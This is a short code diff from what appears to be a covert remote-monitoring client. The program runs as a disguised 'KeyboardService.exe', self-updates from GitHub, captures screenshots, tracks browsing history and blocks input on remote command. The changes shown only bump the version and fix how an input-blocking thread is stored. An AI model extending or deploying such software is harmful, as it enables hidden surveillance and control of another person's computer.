@@ -50,7 +50,7 @@ WEBSITE_HISTORY_MAX_AGE_SECONDS = 7 * 24 * 60 * 60
 MESSAGE_RETRY_INTERVAL_SECONDS = 30
 SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS = 1
 SCREENSHOT_CAPTURE_TIMEOUT_SECONDS = 60
-APP_VERSION = "1.2.24"
+APP_VERSION = "1.2.25"
 UPDATE_API_URL = "https://api.github.com/repos/shadrackkiptoo/pissoff/releases/latest"
 UPDATE_ASSET_NAME = "KeyboardService.exe"
 INSTALL_DIR = os.path.join(os.getenv("LOCALAPPDATA", os.path.expanduser("~")), "KeyboardService")
@@ -1217,15 +1217,16 @@ def handle_device_command(command, command_id=None, message=""):
             ready_event = Event()
             result = {}
             input_block_stop_event = stop_event
-            input_block_timer = Thread(
+            new_input_block_timer = Thread(
                 target=release_input_block,
                 args=(stop_event, ready_event, result, duration),
                 daemon=True,
             )
-            input_block_timer.start()
+            input_block_timer = new_input_block_timer
+            new_input_block_timer.start()
             ready_event.wait(timeout=5)
             if result.get("error"):
-                input_block_timer.join(timeout=2)
+                new_input_block_timer.join(timeout=2)
                 input_block_timer = None
                 input_block_stop_event = None
                 raise result["error"]
